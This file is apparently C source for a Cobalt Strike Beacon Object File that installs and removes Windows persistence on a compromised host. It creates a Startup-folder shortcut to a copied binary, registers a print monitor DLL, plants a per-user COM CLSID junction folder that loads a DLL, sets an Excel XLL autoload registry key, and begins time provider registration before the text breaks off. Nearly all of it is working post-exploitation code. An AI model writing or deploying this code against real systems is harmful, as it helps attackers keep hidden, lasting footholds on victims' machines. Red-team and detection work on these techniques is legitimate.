#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include "beacon.h"
//#define TIME
//#define PRINTMONITOR
//#define ShortCutStartup
//#define JUNCTION
//#define XLL


WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);

#ifdef XLL
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExW(HKEY hKey, LPCWSTR  lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD   lpdwDisposition);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetKeyValueW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteValueW(HKEY hKey, LPCWSTR lpValueName);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY hKey);

WINBASEAPI HRESULT WINAPI SHELL32$SHGetKnownFolderPath(GUID* rfid, DWORD dwFlags, HANDLE hToken, PWSTR* ppszPath);

WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);
#endif

//Junction Folder
#ifdef JUNCTION
WINBASEAPI RPC_STATUS WINAPI RPCRT4$UuidCreate(UUID* Uuid);
WINBASEAPI RPC_STATUS WINAPI RPCRT4$UuidToStringA(const UUID* Uuid, RPC_CSTR* StringUuid);
WINBASEAPI RPC_STATUS WINAPI RPCRT4$RpcStringFreeA(RPC_CSTR* String);
WINBASEAPI RPC_STATUS WINAPI RPCRT4$UuidToStringW(const UUID* Uuid, RPC_WSTR* StringUuid);
WINBASEAPI RPC_STATUS WINAPI RPCRT4$RpcStringFreeW(RPC_WSTR* String);

WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);

WINBASEAPI HRESULT WINAPI SHELL32$SHGetKnownFolderPath(GUID* rfid, DWORD dwFlags, HANDLE hToken, PWSTR* ppszPath);

WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryW(LPWSTR lpPathName);

WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExW(HKEY hKey, LPCWSTR  lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD   lpdwDisposition);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetKeyValueW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY hKey);

WINBASEAPI void WINAPI OLE32$CoTaskMemFree(LPVOID);

#endif

#ifdef ShortCutStartup
#include <winnls.h>

WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcsrchr(const wchar_t* str, wchar_t c);

WINBASEAPI BOOL WINAPI KERNEL32$CopyFileW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileW(LPWSTR, LPWIN32_FIND_DATAW);
WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryW(LPWSTR);


WINBASEAPI HRESULT WINAPI SHELL32$SHGetKnownFolderPath(GUID* rfid, DWORD dwFlags, HANDLE hToken, PWSTR* ppszPath);

WINBASEAPI HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
WINBASEAPI HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID  rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
WINBASEAPI void WINAPI OLE32$CoUninitialize();

typedef struct _IShellLinkW IShellLinkW;

typedef struct _SHITEMID
{
	USHORT cb;
	BYTE abID[1];
} 	SHITEMID;
typedef struct _ITEMIDLIST
{
	SHITEMID mkid;
} 	ITEMIDLIST;

#define PIDLIST_ABSOLUTE         LPITEMIDLIST
#define PCIDLIST_ABSOLUTE        LPCITEMIDLIST
typedef /* [wire_marshal] */ const ITEMIDLIST __unaligned* LPCITEMIDLIST;
typedef /* [wire_marshal] */ ITEMIDLIST __unaligned* LPITEMIDLIST;

typedef struct IShellLinkWVtbl
{
	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in IShellLinkW* This,
			/* [in] */ __RPC__in REFIID riid,
			/* [annotation][iid_is][out] */
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in IShellLinkW* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in IShellLinkW* This);

	HRESULT(STDMETHODCALLTYPE* GetPath)(
		__RPC__in IShellLinkW* This,
		/* [size_is][string][out] */ __RPC__out_ecount_full_string(cch) LPWSTR pszFile,
		/* [in] */ int cch,
		/* [unique][out][in] */ __RPC__inout_opt WIN32_FIND_DATAW* pfd,
		/* [in] */ DWORD fFlags);

	HRESULT(STDMETHODCALLTYPE* GetIDList)(
		__RPC__in IShellLinkW* This,
		/* [out] */ __RPC__deref_out_opt PIDLIST_ABSOLUTE* ppidl);

	HRESULT(STDMETHODCALLTYPE* SetIDList)(
		__RPC__in IShellLinkW* This,
		/* [unique][in] */ __RPC__in_opt PCIDLIST_ABSOLUTE pidl);

	HRESULT(STDMETHODCALLTYPE* GetDescription)(
		__RPC__in IShellLinkW* This,
		/* [size_is][string][out] */ __RPC__out_ecount_full_string(cch) LPWSTR pszName,
		int cch);

	HRESULT(STDMETHODCALLTYPE* SetDescription)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszName);

	HRESULT(STDMETHODCALLTYPE* GetWorkingDirectory)(
		__RPC__in IShellLinkW* This,
		/* [size_is][string][out] */ __RPC__out_ecount_full_string(cch) LPWSTR pszDir,
		int cch);

	HRESULT(STDMETHODCALLTYPE* SetWorkingDirectory)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszDir);

	HRESULT(STDMETHODCALLTYPE* GetArguments)(
		__RPC__in IShellLinkW* This,
		/* [size_is][string][out] */ __RPC__out_ecount_full_string(cch) LPWSTR pszArgs,
		/* [in] */ int cch);

	HRESULT(STDMETHODCALLTYPE* SetArguments)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszArgs);

	HRESULT(STDMETHODCALLTYPE* GetHotkey)(
		__RPC__in IShellLinkW* This,
		/* [out] */ __RPC__out WORD* pwHotkey);

	HRESULT(STDMETHODCALLTYPE* SetHotkey)(
		__RPC__in IShellLinkW* This,
		/* [in] */ WORD wHotkey);

	HRESULT(STDMETHODCALLTYPE* GetShowCmd)(
		__RPC__in IShellLinkW* This,
		/* [out] */ __RPC__out int* piShowCmd);

	HRESULT(STDMETHODCALLTYPE* SetShowCmd)(
		__RPC__in IShellLinkW* This,
		/* [in] */ int iShowCmd);

	HRESULT(STDMETHODCALLTYPE* GetIconLocation)(
		__RPC__in IShellLinkW* This,
		/* [size_is][string][out] */ __RPC__out_ecount_full_string(cch) LPWSTR pszIconPath,
		/* [in] */ int cch,
		/* [out] */ __RPC__out int* piIcon);

	HRESULT(STDMETHODCALLTYPE* SetIconLocation)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszIconPath,
		/* [in] */ int iIcon);

	HRESULT(STDMETHODCALLTYPE* SetRelativePath)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszPathRel,
		/* [in] */ DWORD dwReserved);

	HRESULT(STDMETHODCALLTYPE* Resolve)(
		__RPC__in IShellLinkW* This,
		/* [unique][in] */ __RPC__in_opt HWND hwnd,
		/* [in] */ DWORD fFlags);

	HRESULT(STDMETHODCALLTYPE* SetPath)(
		__RPC__in IShellLinkW* This,
		/* [string][in] */ __RPC__in_string LPCWSTR pszFile);

	END_INTERFACE
} IShellLinkWVtbl;

typedef struct _IShellLinkW
{
	struct IShellLinkWVtbl* lpVtbl;
}IShellLinkW;



#endif

#ifdef TIME
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExW(HKEY hKey, LPCWSTR  lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD   lpdwDisposition);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetKeyValueW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY hKey);

WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
WINBASEAPI void __cdecl MSVCRT$memset(void* dest, int c, size_t count);
WINBASEAPI void __cdecl MSVCRT$free(void* memblock);
WINBASEAPI void* __cdecl MSVCRT$malloc(SIZE_T);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
#endif

#ifdef PRINTMONITOR
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR lpLibFileName);
WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE hLibModule);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);

typedef DWORD(WINAPI* MyAddMonitorW)(LPWSTR pName, DWORD  Level, LPBYTE pMonitors);
typedef DWORD(WINAPI* MyDeleteMonitorW)(LPWSTR pName, LPWSTR pEnvironment, LPWSTR pMonitorName);
#endif

#ifdef ShortCutStartup
//ref : https://www.codeproject.com/Articles/11467/How-to-create-short-cuts-link-files#xx3649586xx
HRESULT Create(LPWSTR pszTargetfile, LPWSTR pszTargetargs,
	LPWSTR pszLinkfile, LPWSTR pszDescription,
	int iShowmode, LPWSTR pszCurdir,
	LPWSTR pszIconfile, int iIconindex)
{
	HRESULT       hRes;                  /* Returned COM result code */
	IShellLinkW* pShellLink = NULL;            /* IShellLink object pointer */
	IPersistFile* pPersistFile = NULL;          /* IPersistFile object pointer */
	WCHAR wszLinkfile[MAX_PATH]; /* pszLinkfile as Unicode
											string */
	int           iWideCharsWritten;
	OLE32$CoInitialize(NULL);
	hRes = E_INVALIDARG;
	static GUID xIID_IShellLinkW = { 0x000214F9L, 0, 0, {0xC0, 0, 0, 0, 0, 0, 0, 0x46} };
	static GUID xCLSID_ShellLink = { 0X00021401, 0 , 0, {0XC0,  0, 0, 0, 0, 0, 0, 0x46} };
	static GUID xIID_IPersistFile = { 0x0000010b, 0 , 0, {0XC0,  0, 0, 0, 0, 0, 0, 0x46} };

	hRes = OLE32$CoCreateInstance(&xCLSID_ShellLink, NULL, 1, &xIID_IShellLinkW, &pShellLink);

	if (SUCCEEDED(hRes))
	{

		/* Set the fields in the IShellLink object */
		hRes = pShellLink->lpVtbl->SetPath(pShellLink, (LPCWSTR)pszTargetfile);

		hRes = pShellLink->lpVtbl->SetArguments(pShellLink, pszTargetargs);

		if (MSVCRT$wcslen(pszDescription) > 0)
		{
			hRes = pShellLink->lpVtbl->SetDescription(pShellLink, pszDescription);
		}
		if (iShowmode > 0)
		{
			hRes = pShellLink->lpVtbl->SetShowCmd(pShellLink, iShowmode);
		}
		if (MSVCRT$wcslen(pszCurdir) > 0)
		{
			hRes = pShellLink->lpVtbl->SetWorkingDirectory(pShellLink, pszCurdir);
		}
		if (MSVCRT$wcslen(pszIconfile) > 0 && iIconindex >= 0)
		{
			hRes = pShellLink->lpVtbl->SetIconLocation(pShellLink, pszIconfile, iIconindex);
		}

		/* Use the IPersistFile object to save the shell link */
		hRes = pShellLink->lpVtbl->QueryInterface(pShellLink, &xIID_IPersistFile, &pPersistFile);
		if (SUCCEEDED(hRes))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Success QueryInterface\n");
			hRes = pPersistFile->lpVtbl->Save(pPersistFile, pszLinkfile, TRUE);
			pPersistFile->lpVtbl->Release(pPersistFile);
		}
		else
			BeaconPrintf(CALLBACK_ERROR, "Failed QueryInterface\n");
		pShellLink->lpVtbl->Release(pShellLink);
	}
	else
		BeaconPrintf(CALLBACK_ERROR, "Error CoCreateInstance\n");


	OLE32$CoUninitialize();
	return (hRes);
}


BOOL BuildShortCut(int cmd, wchar_t* newFolder, wchar_t* path2Hijack)
{
	HRESULT hRes;
	const GUID xFOLDERID_Startup = { 0xB97D20BB, 0xF46A, 0x4C97, {0xBA, 0x10, 0x5E, 0x36, 0x08, 0x43, 0x08, 0x54 } };
	wchar_t dstPath[512] = { 0 };
	wchar_t* newLinkName = L"shortcut.lnk";
	wchar_t* file2Hijack = MSVCRT$wcsrchr(path2Hijack, '\\');

	if (cmd == 0)
	{
		if (file2Hijack == NULL)
		{
			BeaconPrintf(CALLBACK_ERROR, "Error parsing commands\n");
			return FALSE;
		}

		if (!KERNEL32$CreateDirectoryW(newFolder, NULL) && ERROR_ALREADY_EXISTS != KERNEL32$GetLastError())
		{
			BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder\n");
			return FALSE;
		}

		MSVCRT$wcscpy(dstPath, newFolder);
		MSVCRT$wcscat(dstPath, file2Hijack);
		MSVCRT$wcscat(dstPath, L"\0");
		

		if (KERNEL32$CopyFileW(path2Hijack, dstPath, FALSE))
		{
			PWSTR userpath = NULL;
			hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_Startup, 0, NULL, &userpath);

			MSVCRT$wcscat(userpath, L"\\");
			MSVCRT$wcscat(userpath, newLinkName);

			hRes = Create((LPWSTR)dstPath, (LPWSTR)L"", (LPWSTR)userpath, (LPWSTR)L"", SW_SHOWMINNOACTIVE, (LPWSTR)newFolder, (LPWSTR)L"", 0);
			if (SUCCEEDED(hRes))
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Success Create shortcut\n");
			else
				BeaconPrintf(CALLBACK_ERROR, "Failed Create shortcut\n");

		}
	}
	else
	{
		HANDLE hFind = NULL;
		PWSTR userpath = NULL;
		hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_Startup, 0, NULL, &userpath);
		//Delete shortcut file
		MSVCRT$wcscat(userpath, L"\\");
		MSVCRT$wcscat(userpath, newLinkName);
		if (KERNEL32$DeleteFileW(userpath))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Success delete shortcut\n");
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to delete shortcut\n");
		}

		//Delete files in folder
		LPWIN32_FIND_DATAW lpFindFileData = 0;
		MSVCRT$wcscpy(dstPath, newFolder);
		MSVCRT$wcscpy(dstPath, L"\\*");
		hFind = KERNEL32$FindFirstFileW(dstPath, lpFindFileData);
		BOOL success = TRUE;
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{

				if (!KERNEL32$DeleteFileW(lpFindFileData->cFileName))
				{
					success = FALSE;
				}

			} while (KERNEL32$FindNextFileW(hFind, lpFindFileData));

			if (success)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Success delete files\n");
				if (KERNEL32$RemoveDirectoryW(newFolder))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Success delete folder %ls\n", newFolder);
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %ls\n", newFolder);
				}
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to delete all files in %ls\n", newFolder);
			}

			KERNEL32$FindClose(hFind);
			


		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to find files\n");
		}

	}

	return 1;
}
#endif

#ifdef PRINTMONITOR
BOOL PrintMonitorPersistence(int cmd, wchar_t* monName, wchar_t* dllname)
{
	BOOL success;
	WCHAR monEnv[] = L"Windows x64";
	HANDLE hWinSpool = NULL;

	hWinSpool = KERNEL32$LoadLibraryW(L"winspool.drv");
	if (NULL == hWinSpool)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to load winspool\n");
	}
	//Add a monitor for persistence
	if (cmd == 0)
	{
		MONITOR_INFO_2W monitorInfo;
		// print monitor name
		monitorInfo.pName = (LPWSTR)monName;
		monitorInfo.pEnvironment = (LPWSTR)monEnv;
		// print monitor server DLL name
		monitorInfo.pDLLName = (LPWSTR)dllname;
		MyAddMonitorW pAddMonitorW = (MyAddMonitorW)GetProcAddress(hWinSpool, "AddMonitorW");
		success = pAddMonitorW(NULL, 2, (LPBYTE)&monitorInfo);
		if (success == 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "AddMonitor failed, GLE: %d\n", KERNEL32$GetLastError());
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added %ls for %ls\n", monName, dllname);
	}
	//clean up a monitor
	else if (cmd == 1)
	{
		MyDeleteMonitorW pDeleteMonitorW = (MyDeleteMonitorW)GetProcAddress(hWinSpool, "DeleteMonitorW");
		success = pDeleteMonitorW(NULL, monEnv, monName);
		if (success == 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "DeleteMonitor failed, GLE: %d\n", KERNEL32$GetLastError());
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", monName);


		if (!KERNEL32$DeleteFileW((LPCWSTR)dllname))
		{
			success = FALSE;
			BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", dllname, KERNEL32$GetLastError());
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", dllname);
	}
	//Don't really want this remaining mapped ot the process
	if (hWinSpool)
		KERNEL32$FreeLibrary(hWinSpool);
	return success;
}
#endif


#ifdef JUNCTION

BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* CLSID)
{
	LSTATUS status = -1;
	HKEY phkResult = 0;
	size_t len = 0;
	BOOL success = TRUE;
	WCHAR* pknownStartupPath = NULL;

	UUID myuid;
	RPC_WSTR uidstr;
	HRESULT hRes;
	wchar_t baseKeyPath[512] = {0};
	wchar_t startupPath[MAX_PATH] = {0};

	const GUID xFOLDERID_StartMenu = { 0x625B53C3, 0xAB48, 0x4EC1, { 0xBA, 0x1F, 0xA1, 0xEF, 0x41, 0x46, 0xFC, 0x19 } };

	wchar_t pFullKeyPath[512] = L"Software\\Classes\\CLSID\\{";
	wchar_t* inproc = L"}\\InProcServer32";
	wchar_t* shellFlder = L"}\\ShellFolder";

	//%APPDATA%\Microsoft\Windows\Start Menu
	hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_StartMenu, 0, NULL, &pknownStartupPath);
	if (hRes != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
		return FALSE;
	}


	MSVCRT$wcscpy(startupPath, pknownStartupPath);
	MSVCRT$wcscat(startupPath, L"\\Programs\\Accessories\\");
	MSVCRT$wcscat(startupPath, folderName);

	MSVCRT$wcscat(dllPath, L"\0");

	if (clean == 0)
	{
		//Build our registry key string
		RPCRT4$UuidCreate(&myuid);
		RPCRT4$UuidToStringW(&myuid, &uidstr);
		MSVCRT$wcscat(pFullKeyPath, uidstr);

		//Save the base key with CLSID
		MSVCRT$wcscpy(baseKeyPath, pFullKeyPath);

		//add ShellFolder
		MSVCRT$wcscat(baseKeyPath, shellFlder);
		MSVCRT$wcscat(baseKeyPath, L"\0");

		//add inprocserver
		MSVCRT$wcscat(pFullKeyPath, inproc);
		MSVCRT$wcscat(pFullKeyPath, L"\0");

		MSVCRT$wcscat(startupPath, L".{");
		MSVCRT$wcscat(startupPath, uidstr);
		MSVCRT$wcscat(startupPath, L"}");
		MSVCRT$wcscat(startupPath, L"\0");

		//Add new CLSID key
		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, NULL);
		if (0 != status)
		{
			success = FALSE;
		}
		//Add InProcServer keys
		if (success)
		{
			WCHAR lpValueName[] = L"";
			
			len = MSVCRT$wcslen(dllPath) * 2 + 1;
			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, lpValueName, REG_EXPAND_SZ, dllPath, (DWORD)len);
			if (0 != status)
			{
				ADVAPI32$RegCloseKey(phkResult);
				success = FALSE;
			}

			WCHAR* model = L"ThreadingModel";
			WCHAR* apartment = L"Apartment";
			len = MSVCRT$wcslen(apartment) * 2 + 1;
			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, model, REG_SZ, apartment, (DWORD)len);
			if (0 != status)
			{
				ADVAPI32$RegCloseKey(phkResult);
				success = FALSE;
			}


		}

		//Add ShellFolder keys
		if(success)
		{

			ADVAPI32$RegCloseKey(phkResult);
			phkResult = 0;
			status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, baseKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, NULL);
			if (0 != status)
			{
				success = FALSE;
			}
			WCHAR* attributes = L"Attributes";
			DWORD value = 4035969341;

			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, baseKeyPath, attributes, REG_DWORD, (BYTE*)&value, sizeof(value));
			if (0 != status)
			{
				ADVAPI32$RegCloseKey(phkResult);
				success = FALSE;
			}
		}

		if (success)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Key Created Software\\Classes\\CLSID\\%ls\\InProcServer32\n", uidstr);

			//Add our junction folder
			success = KERNEL32$CreateDirectoryW(startupPath, NULL);
			if (!success)
			{

				BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder\n");
				success = FALSE;

			}
			BeaconPrintf(CALLBACK_OUTPUT, "[*]Created File %ls\n", startupPath);
			

		}

		ADVAPI32$RegCloseKey(phkResult);
		RPCRT4$RpcStringFreeW(&uidstr);
	}
	else if (clean == 1)
	{
		wchar_t shellKeyPath[512] = {0};
		MSVCRT$wcscat(startupPath, L".{");
		MSVCRT$wcscat(startupPath, CLSID);
		MSVCRT$wcscat(startupPath, L"}");
		MSVCRT$wcscat(startupPath, L"\0");
		BeaconPrintf(CALLBACK_ERROR, "Trying to clean startup path %ls\n", startupPath);

		MSVCRT$wcscat(pFullKeyPath, CLSID);
	
		//Need this to delete top key
		MSVCRT$wcscpy(baseKeyPath, pFullKeyPath);
		MSVCRT$wcscat(baseKeyPath, L"}");
		MSVCRT$wcscat(baseKeyPath, L"\0");

		//Need this to delete shell subkey
		MSVCRT$wcscat(shellKeyPath, pFullKeyPath);
		MSVCRT$wcscat(shellKeyPath, shellFlder);
		MSVCRT$wcscat(shellKeyPath, L"\0");

		//Need this to delete inproc subkey
		MSVCRT$wcscat(pFullKeyPath, inproc);
		MSVCRT$wcscat(pFullKeyPath, L"\0");


		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, pFullKeyPath);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
			success = FALSE;
		}
		else
		{

			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", pFullKeyPath);
		}

		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, shellKeyPath);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
			success = FALSE;
		}
		else
		{

			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", shellKeyPath);
		}


		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, baseKeyPath);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
			success = FALSE;
		}
		else
		{

			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", baseKeyPath);
		}

		if (!KERNEL32$RemoveDirectoryW(startupPath))
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not delete folder! ERROR %d\n", KERNEL32$GetLastError());
			success = FALSE;
		}
		else
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[+]Successfully deleted %ls\n", startupPath);
		}
		if (!KERNEL32$DeleteFileW((LPCWSTR)dllPath))
		{
			success = FALSE;
			BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", dllPath, KERNEL32$GetLastError());
		}
		else
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", dllPath);
		}

	}

	OLE32$CoTaskMemFree((LPVOID)pknownStartupPath);

	return success;
}
#endif

#ifdef XLL
BOOL XllSetup(int clean, wchar_t* xllName, wchar_t* excelVersion)
{
	LSTATUS status = -1;
	HKEY phkResult = 0;
	size_t len = 0;
	BOOL success = TRUE;
	wchar_t xllPath[MAX_PATH] = {0};
	wchar_t pFullKeyPath[512] = L"Software\\Microsoft\\Office\\";
	MSVCRT$wcscat(pFullKeyPath, excelVersion);
	wchar_t* pKeyRemainder = L".0\\Excel\\Options\0";
	MSVCRT$wcscat(pFullKeyPath, pKeyRemainder);
	wchar_t* openKey = L"OPEN";

			//Open HKEY_CURRENT_USER\Software\Microsoft\Office\{VERSION}\Excel\Options
		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, NULL, &phkResult, NULL);
		if (0 != status)
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not create %ls, Error: %d\n", pFullKeyPath, KERNEL32$GetLastError());
			return FALSE;
		}

	if (clean == 0)
	{
			MSVCRT$wcscat(xllPath, L"/R ");
			MSVCRT$wcscat(xllPath, xllName);
			MSVCRT$wcscat(xllPath, L"\0");
			len = MSVCRT$wcslen(xllPath) * 2 + 1;
			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, openKey, REG_SZ, xllPath, (DWORD)len);
			if (0 != status)
			{
				success = FALSE;
			}
		
	}
	else
	{
		status = ADVAPI32$RegDeleteValueW(phkResult, openKey);
		if (0 != status)
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not delete registry key, Error: %d\n", KERNEL32$GetLastError());
			success = FALSE;
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully cleaned registry key\n");
		//%APPDATA%
		const GUID xFOLDERID_AppData = { 0x3EB685DB, 0x65F9, 0x4CF6, { 0xA0, 0x3A, 0xE3, 0xEF, 0x65, 0x72, 0x9F, 0x3D } };
		WCHAR* pAppDataPath = NULL;
		HRESULT hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_AppData, 0, NULL, &pAppDataPath);
		if (hRes != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
			success = FALSE;
		}
		else
		{
			MSVCRT$wcscat(xllPath, pAppDataPath);
			MSVCRT$wcscat(xllPath, L"\\Microsoft\\AddIns\\");
			MSVCRT$wcscat(xllPath, xllName);
			MSVCRT$wcscat(xllPath, L"\0");
			if (!KERNEL32$DeleteFileW((LPCWSTR)xllPath))
			{
				success = FALSE;
				BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", xllPath, KERNEL32$GetLastError());
			}
			else
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", xllPath);
			}
		}


	}

	if (phkResult)
		ADVAPI32$RegCloseKey(phkResult);

	
	return success;
}
#endif

#ifdef TIME
// Based on https://pentestlab.blog/2019/10/22/persistence-time-providers/
BOOL RegisterTimeProvider(int cmd, wchar_t* pFullKeyPath, wchar_t* dllName)
{
	LSTATUS status = -1;
	HKEY phkResult = 0;
	DWORD dwDisposition = 0;


	if (cmd == 0)
	{
		status = ADVAPI32$RegCreateKeyExW(HKEY_LOCAL_MACHINE, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, &dwDisposition);
		if (status)
		{
